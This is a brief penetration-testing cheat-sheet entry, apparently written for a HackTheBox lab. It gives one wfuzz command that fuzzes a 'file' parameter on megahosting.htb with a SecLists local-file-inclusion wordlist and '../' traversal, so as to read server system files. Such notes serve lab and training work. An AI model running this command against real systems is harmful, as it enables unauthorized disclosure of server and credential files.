# WFuzz

LFI fuzz
----
```
wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 403,404 -u http://megahosting.htb/news.php?file=../../../../FUZZ | grep -v '0 Ch'
```